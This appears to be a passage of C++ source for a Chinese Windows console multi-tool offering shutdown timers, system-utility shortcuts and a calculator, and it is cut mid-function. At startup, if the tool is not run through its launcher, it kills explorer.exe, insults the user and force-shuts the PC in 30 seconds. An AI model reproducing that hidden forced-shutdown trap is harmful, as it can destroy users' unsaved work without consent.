#include "stdafx.h"
#include "stdafx.cpp"
#include "psapi.h"  
#define LEAST_COUNTDOWN 0



void thecountdowndosth(char *who, char *whattodo, int num, int least_countdown);
void theclean(void);
void therestartover(void);
void thetime(void);
int main()
{
	//	FILE * fp1 = fopen("Settings.ini", "r");
	//	char setusepassword[100];
	//	char setpassword[100];
	//	char setdoubleclickstartmainexe[100];
	char str[100];
	char str2[100];
	char str3[100];
	char str4[80];
	char str5[100];
	int setshutdownorrestarttime;
	HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
	DeleteMenu(GetSystemMenu(GetConsoleWindow(), FALSE), SC_CLOSE, MF_BYCOMMAND); //禁止关闭程序
	DrawMenuBar(GetConsoleWindow());
	system("title 多功能工具");
	system("mode con cols=65 lines=32");
	if (!system("taskkill /f /im start.exe") == NULL)
	{
		system("cls");
		system("taskkill /f /im explorer.exe");
		system("cls");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED);
		printf("愚蠢");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("之人。\n");
		system("start CountDownShutdown.exe");
		system("shutdown -f -s -t 30");
		Sleep(30000);
		exit(0);
	}
	else
	{
		system("md .\\logs>nul");
		system("fsutil file createnew .\\logs\\Multi-tool.log 1000>nul");
		system("echo @By Xu(QQ1036673441).>>.\\logs\\Multi-tool.log");
		system("echo @以下命令不分大小写。>>.\\logs\\Multi-tool.log");
		system("echo @启动关机或重启命令后,你可以输入QX终止任务。>>.\\logs\\Multi-tool.log");
		system("echo @输入GJ在30秒后关闭计算机。>>.\\logs\\Multi-tool.log");
		system("echo @输入CQ在30秒后重启计算机。>>.\\logs\\Multi-tool.log");
		system("echo @输入QX终止关机或重启任务。>>.\\logs\\Multi-tool.log");
		system("echo @输入RG打开任务管理器。>>.\\logs\\Multi-tool.log");
		system("echo @输入KM打开控制面板。>>.\\logs\\Multi-tool.log");
		system("echo @输入JS打开计算器。>>.\\logs\\Multi-tool.log");
		system("echo @输入ZC打开注册表编辑器。>>.\\logs\\Multi-tool.log");
		system("echo @输入MS产生音乐。>>.\\logs\\Multi-tool.log");
		system("echo @输入IP查看IP信息。>>.\\logs\\Multi-tool.log");
		system("echo @输入QL清理垃圾文件。>>.\\logs\\Multi-tool.log");
		system("echo @输入CMD打开命令提示符。>>.\\logs\\Multi-tool.log");
		system("echo @输入XF修复系统文件。>>.\\logs\\Multi-tool.log");
		system("echo @输入ZJS使用计算功能。>>.\\logs\\Multi-tool.log");
		system("echo @输入任意盘符打开任意分区。>>.\\logs\\Multi-tool.log");
		system("echo @输入DEL删除程序。>>.\\logs\\Multi-tool.log");
		system("echo @输入GB关闭程序。>>.\\logs\\Multi-tool.log");
		system("cls");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("By Xu(QQ1036673441).\n");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		_getcwd(str4, sizeof(str4));
		printf("当前目录为%s", str4);
		printf("\n");
		thetime();
		printf("printf(\"Hello World\");\n");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("以下所有命令不分大小写。\n");
		printf("启动");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("关机或重启");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("命令后,你可以输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("QX");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("终止任务。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("GJ");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("在30秒后关闭计算机");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("CQ");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("在30秒后重启计算机");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("QX");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("终止关机或重启任务");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("RG");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("打开任务管理器");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("KM");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("打开控制面板");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("JS");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("打开计算器");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("ZC");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("打开注册表编辑器");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("MS");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("发出音乐");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("IP");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("查看IP信息");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("QL");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("清理垃圾文件");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("CMD");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("打开命令提示符");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("XF");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("修复系统文件");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("ZJS");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("使用计算功能");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("任意盘符");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("打开任意分区");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("DEL");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("删除程序");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		printf("GB");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		printf("关闭程序");
		SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		printf("。\n");
		printf("输入：");
		scanf_s("%s", str, 10);
		{
			if (_stricmp(str, "GJ") == 0)
			{
				system("echo @输入:GJ>>.\\logs\\Multi-tool.log");
				system("echo @系统将在30秒后关机。>>.\\logs\\Multi-tool.log");
				system("echo @输入QX终止关机任务。>>.\\logs\\Multi-tool.log");
				system("echo @输入FS立刻关机。>>.\\logs\\Multi-tool.log");
				system("cls");
				system("shutdown -f -s -t 30");
				system("start main/CountDownShutdown.exe");
				printf("系统将在30秒后关机。\n");
				printf("输入");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
				printf("QX");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
				printf("终止关机任务");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
				printf("。\n");
				printf("输入");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
				printf("FS");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
				printf("立刻关机");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
				printf("。\n");
				printf("输入:");
				scanf_s("%s", str3, 10);
				{
					if (_stricmp(str3, "QX") == 0)
					{
						system("shutdown -a");
						system("echo @输入:QX>>.\\logs\\Multi-tool.log");
						system("echo @关机任务已取消。>>.\\logs\\Multi-tool.log");
						system("cls");
						system("taskkill /im CountDownShutdown.exe");
						SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
						printf("关机任务已取消");
						SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
						printf("。\n");
						therestartover();
					}
					else if (_stricmp(str3, "FS") == 0)
					{
						system("echo @输入:FS>>.\\logs\\Multi-tool.log");
						system("shutdown -a");
						system("taskkill /im CountDownShutdown.exe");
						system("shutdown -f -s -t 0");
						exit(0);
					}
					else
					{
						system("echo @输入:>>.\\logs\\Multi-tool.log");
						system("echo @没有该指令。>>.\\logs\\Multi-tool.log");
						system("cls");
						SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
						printf("没有该指令");
						SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
						printf("。\n");
						therestartover();
					}
				}
			}
			else if (_stricmp(str, "CQ") == 0)
			{
				system("echo @输入:CQ>>.\\logs\\Multi-tool.log");
				system("echo @系统将在30秒后重启。>>.\\logs\\Multi-tool.log");
				system("echo @输入QX终止重启任务。>>.\\logs\\Multi-tool.log");
				system("echo @输入FS立刻重启。>>.\\logs\\Multi-tool.log");
				system("cls");
				system("shutdown -f -r -t 30");
				system("start main/CountDownRestart.exe");
				printf("输入");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
				printf("QX");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
				printf("终止重启任务");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
				printf("。\n");
				printf("输入");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
				printf("FS");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
				printf("立刻重启。\n");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
				printf("。\n");
				printf("输入:");
				scanf_s("%s", str3, 10);
				{
					if (_stricmp(str3, "QX") == 0)
					{
						system("shutdown -a");
						system("echo @输入:QX>>.\\logs\\Multi-tool.log");
						system("echo @重启任务已取消。>>.\\logs\\Multi-tool.log");
						system("cls");
						system("taskkill /im CountDownRestart.exe");
						SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
						printf("重启任务已取消");
						SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
						printf("。\n");
						therestartover();
					}
					else if (_stricmp(str3, "FS") == 0)
					{
						system("echo @输入:FS>>.\\logs\\Multi-tool.log");
						system("shutdown -a");
						system("taskkill /im CountDownRestart.exe");
						system("shutdown -f -r -t 0");
						exit(0);
					}
					else
					{
						system("echo @输入:>>.\\logs\\Multi-tool.log");
						system("echo @没有该指令。>>.\\logs\\Multi-tool.log");
						system("cls");
						SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
						printf("没有该指令");
						SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
						printf("。\n");
						therestartover();
					}
				}
			}
			else if (_stricmp(str, "RG") == 0)
			{
				system("echo @输入:RG>>.\\logs\\Multi-tool.log");
				system("cls");
				system("taskmgr");
				therestartover();
			}
			else if (_stricmp(str, "KM") == 0)
			{
				system("echo @输入:KM>>.\\logs\\Multi-tool.log");
				system("cls");
				system("control");
				therestartover();
			}
			else if (_stricmp(str, "C") == 0)
			{
				system("echo @输入:C>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start c:");
				therestartover();
			}
			else if (_stricmp(str, "A") == 0)
			{
				system("echo @输入:A>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start a:");
				therestartover();
			}
			else if (_stricmp(str, "B") == 0)
			{
				system("echo @输入:B>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start b:");
				therestartover();
			}
			else if (_stricmp(str, "D") == 0)
			{
				system("echo @输入:D>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start d:");
				therestartover();
			}
			else if (_stricmp(str, "E") == 0)
			{
				system("echo @输入:E>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start e:");
				therestartover();
			}
			else if (_stricmp(str, "F") == 0)
			{
				system("echo @输入:F>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start f:");
				therestartover();
			}
			else if (_stricmp(str, "G") == 0)
			{
				system("echo @输入:G>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start g:");
				therestartover();
			}
			else if (_stricmp(str, "H") == 0)
			{
				system("echo @输入:H>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start h:");
				therestartover();
			}
			else if (_stricmp(str, "I") == 0)
			{
				system("echo @输入:I>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start i:");
				therestartover();
			}
			else if (_stricmp(str, "J") == 0)
			{
				system("echo @输入:J>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start j:");
				therestartover();
			}
			else if (_stricmp(str, "K") == 0)
			{
				system("echo @输入:K>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start k:");
				therestartover();
			}
			else if (_stricmp(str, "L") == 0)
			{
				system("echo @输入:L>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start l:");
				therestartover();
			}
			else if (_stricmp(str, "M") == 0)
			{
				system("echo @输入:M>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start m:");
				therestartover();
			}
			else if (_stricmp(str, "N") == 0)
			{
				system("echo @输入:N>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start n:");
				therestartover();
			}
			else if (_stricmp(str, "O") == 0)
			{
				system("echo @输入:O>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start o:");
				therestartover();
			}
			else if (_stricmp(str, "P") == 0)
			{
				system("echo @输入:P>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start p:");
				therestartover();
			}
			else if (_stricmp(str, "Q") == 0)
			{
				system("echo @输入:Q>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start q:");
				therestartover();
			}
			else if (_stricmp(str, "R") == 0)
			{
				system("echo @输入:R>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start r:");
				therestartover();
			}
			else if (_stricmp(str, "S") == 0)
			{
				system("echo @输入:S>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start s:");
				therestartover();
			}
			else if (_stricmp(str, "T") == 0)
			{
				system("echo @输入:T>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start t:");
				therestartover();
			}
			else if (_stricmp(str, "U") == 0)
			{
				system("echo @输入:U>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start u:");
				therestartover();
			}
			else if (_stricmp(str, "V") == 0)
			{
				system("echo @输入:V>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start v:");
				therestartover();
			}
			else if (_stricmp(str, "W") == 0)
			{
				system("echo @输入:W>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start w:");
				therestartover();
			}
			else if (_stricmp(str, "X") == 0)
			{
				system("echo @输入:X>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start x:");
				therestartover();
			}
			else if (_stricmp(str, "Y") == 0)
			{
				system("echo @输入:Y>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start y:");
				therestartover();
			}
			else if (_stricmp(str, "Z") == 0)
			{
				system("echo @输入:Z>>.\\logs\\Multi-tool.log");
				system("cls");
				system("start z:");
				therestartover();
			}
			else if (_stricmp(str, "JS") == 0)
			{
				system("echo @输入:JS>>.\\logs\\Multi-tool.log");
				system("cls");
				system("calc");
				therestartover();
			}
			else if (_stricmp(str, "ZC") == 0)
			{
				system("echo @输入:ZC>>.\\logs\\Multi-tool.log");
				system("cls");
				system("regedit");
				therestartover();
			}
			else if (_stricmp(str, "IP") == 0)
			{
				system("echo @输入:IP>>.\\logs\\Multi-tool.log");
				system("cls");
				system("ipconfig");
				therestartover();
			}
			else if (_stricmp(str, "CMD") == 0)
			{
				system("echo @输入:CMD>>.\\logs\\Multi-tool.log");
				system("cls");
				DeleteMenu(GetSystemMenu(GetConsoleWindow(), TRUE), SC_CLOSE, MF_BYCOMMAND); //允许关闭CMD窗口
				DrawMenuBar(GetConsoleWindow());
				HANDLE con = GetStdHandle(STD_OUTPUT_HANDLE); //恢复原来窗口设置
				COORD buf = { 120,400 };
				SetConsoleScreenBufferSize(con, buf);
				system("title cmd");
				system("cls");
				system("cmd");
				system("start start.exe");
				Sleep(5000);
			}
			else if (_stricmp(str, "GB") == 0)
			{
				system("echo @输入:GB>>.\\logs\\Multi-tool.log");
				system("cls");
				exit(0);
			}
			else if (_stricmp(str, "QX") == 0)
			{
				system("echo @输入:QX>>.\\logs\\Multi-tool.log");
				system("cls");
				if (!system("taskkill /f /im CountDownShutdown.exe") == NULL)
				{
					system("cls");
					if (!system("taskkill /f /im CountDownRestart.exe") == NULL)
					{
						if (!system("shutdown -a") == NULL)
						{
							system("echo @无任何重启或关闭任务运行。>>.\\logs\\Multi-tool.log");
							system("cls");
							SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
							printf("无任何重启或关闭任务运行");
							SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
							printf("。\n");
							therestartover();
						}
						else
						{
							system("echo @关机或重启任务已取消。>>.\\logs\\Multi-tool.log");
							system("cls");
							SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
							printf("关机或重启任务已取消");
							SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
							printf("。\n");
							therestartover();
						}
					}
					else
					{
						system("echo @重启任务已取消。>>.\\logs\\Multi-tool.log");
						system("cls");
						system("shutdown -a");
						SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
						printf("重启任务已取消");
						SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
						printf("。\n");
						therestartover();
					}
				}
				else
				{
					system("echo @关机任务已取消。>>.\\logs\\Multi-tool.log");
					system("cls");
					system("shutdown -a");
					SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
					printf("关机任务已取消");
					SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
					printf("。\n");
					therestartover();
				}
			}
			else if (_stricmp(str, "MS") == 0)
			{
				system("echo @输入:MS>>.\\logs\\Multi-tool.log");
				system("cls");
				Beep(500, 500);
				Beep(600, 500);
				Beep(700, 500);
				Beep(800, 500);
				Beep(900, 500);
				Beep(1000, 500);
				Beep(1100, 500);
				Beep(494, 200);
				Beep(523, 300);
				Beep(578, 400);
				Beep(659, 500);
				Beep(698, 600);
				Beep(784, 700);
				Beep(880, 800);
				Beep(932, 900);
				Beep(1046, 1000);
				Beep(1175, 1100);
				Beep(1381, 1200);
				Beep(1480, 1300);
				Beep(1661, 1400);
				therestartover();
			}
			else if (_stricmp(str, "XF") == 0)
			{
				system("echo @输入:XF>>.\\logs\\Multi-tool.log");
				system("cls");
				system("sfc /SCANNOW");
				therestartover();
			}
			else if (_stricmp(str, "DEL") == 0)
			{
				system("echo @输入:DEL>>.\\logs\\Multi-tool.log");
				printf("输入");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
				printf("Y");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
				printf("确认");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
				printf("。\n");
				printf("输入:");
				scanf_s("%s", str2, 10);
				{
					if (_stricmp(str2, "Y") == 0)
					{
						SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
						printf("任务大约需要10秒。\n");
						system("fsutil file createnew .\\Del_Temp.bat");
						system("echo @echo 确认?>>.\\Del_Temp.bat");
						system("echo @pause>>.\\Del_Temp.bat");
						system("echo rmdir /s /q .\\main>>.\\Del_Temp.bat");
						Sleep(2000);
						printf("任务初始化中....\n");
						system("echo rmdir /s /q .\\logs>>.\\Del_Temp.bat");
						system("echo del /f /q start.exe>>.\\Del_Temp.bat");
						system("echo del /f /q ReadMe.txt>>.\\Del_Temp.bat");
						system("echo del Del_Temp.bat>>.\\Del_Temp.bat");
						system("echo exit>>.\\Del_Temp.bat");
						Sleep(2000);
						printf("任务执行中....\n");
						Sleep(2000);
						system("start Del_Temp.bat");
					}
					else
					{
						system("echo @输入:>>.\\logs\\Multi-tool.log");
						therestartover();
					}
				}
			}
			else if (_stricmp(str, "ZJS") == 0)
			{
				float X;
				float X_2;
				float X_3;
				float A;
				float Y;
				float B;
				float D;
				float C;
				system("cls");
				system("echo @输入:ZJS>>.\\logs\\Multi-tool.log");
				system("echo @请输入计算内容。>>.\\logs\\Multi-tool.log");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
				printf("请");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
				printf("输入");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
				printf("计算内容");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
				printf("。\n");
				printf("1.A+D\n");
				printf("2.A-D\n");
				printf("3.A*D\n");
				printf("4.A/D\n");
				printf("5.X^2\n");
				printf("6.X^3\n");
				printf("7.Y=AX+B\n");
				printf("8.Y=AX^3+BX^2+C\n");
				printf("9.X^B\n");
				printf("输入:");
				scanf_s("%s", str5, 10);
				if (_stricmp(str5, "1") == 0)
				{
					system("echo @输入:1>>.\\logs\\Multi-tool.log");
					system("cls");
					printf("A=");
					scanf_s("%f", &A);
					printf("D=");
					scanf_s("%f", &D);
					Y = A + D;
					printf("%.2f+%.2f=%.2f", A, D, Y);
					therestartover();

				}
				else if (_stricmp(str5, "2") == 0)
				{
					system("echo @输入:2>>.\\logs\\Multi-tool.log");
					system("cls");
					printf("A=");
					scanf_s("%f", &A);
					printf("D=");
					scanf_s("%f", &D);
					Y = A - D;
					printf("%.2f-%.2f=%.2f", A, D, Y);
					therestartover();

				}
				else if (_stricmp(str5, "3") == 0)
				{
					system("echo @输入:3>>.\\logs\\Multi-tool.log");
					system("cls");
					printf("A=");
					scanf_s("%f", &A);
					printf("D=");
					scanf_s("%f", &D);
					Y = A * D;
					printf("%.2f*%.2f=%.2f", A, D, Y);
					therestartover();

				}
				else if (_stricmp(str5, "4") == 0)
				{
					system("echo @输入:4>>.\\logs\\Multi-tool.log");
					system("cls");
					printf("A=");
					scanf_s("%f", &A);
					printf("D=");
					scanf_s("%f", &D);
					{
						if (D == 0)
						{
							system("cls");
							printf("除数不能为0。\n\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a");
							therestartover();
						}
						else
						{
							Y = A / D;
							printf("%.2f+%.2f=%.2f", A, D, Y);
							therestartover();
						}
					}
				}
				else if (_stricmp(str5, "5") == 0)
				{
					system("echo @输入:5>>.\\logs\\Multi-tool.log");
					system("cls");
					printf("A=");
					scanf_s("%f", &X);
					X_2 = X*X;
					printf("%.2f^2=%.2f\n", X, X_2);
					therestartover();

				}
				else if (_stricmp(str5, "6") == 0)
				{
					system("echo @输入:6>>.\\logs\\Multi-tool.log");
					system("cls");
					printf("A=");
					scanf_s("%f", &X);
					X_3 = X*X*X;
					printf("%.2f^3=%.2f\n", X, X_3);
					therestartover();
				}
				else if (_stricmp(str5, "7") == 0)
				{
					system("echo @输入:7>>.\\logs\\Multi-tool.log");
					system("cls");
					printf("A,X,B可以为0。\n");
					printf("X=");
					scanf_s("%f", &X);
					printf("A=");
					scanf_s("%f", &A);
					printf("B=");
					scanf_s("%f", &B);
					Y = A*X + B;
					printf("%.2f*%.2f+%.2f=%.2f\n", A, X, B, Y);
					therestartover();
				}
				else if (_stricmp(str5, "8") == 0)
				{
					system("echo @输入:8>>.\\logs\\Multi-tool.log");
					system("cls");
					printf("A,X,B可以为0。\n");
					printf("X=");
					scanf_s("%f", &X);
					printf("A=");
					scanf_s("%f", &A);
					printf("B=");
					scanf_s("%f", &B);
					printf("C=");
					scanf_s("%f", &C);
					X_2 = X*X;
					X_3 = X*X*X;
					Y = X_3*A + B*X_2 + C;
					printf("%.2f*%.2f^3+%.2f*%.2f^2+%.2f\n=%.2f*%.2f+%.2f*%.2f+%.2f\n=%.2f\n", A, X, B, X, C, A, X_3, B, X_2, C, Y);
					therestartover();
				}
				else if (_stricmp(str5, "9") == 0)
				{
					system("echo @输入:9>>.\\logs\\Multi-tool.log");
					system("cls");
					printf("X=");
					scanf_s("%f", &X);
					printf("B=");
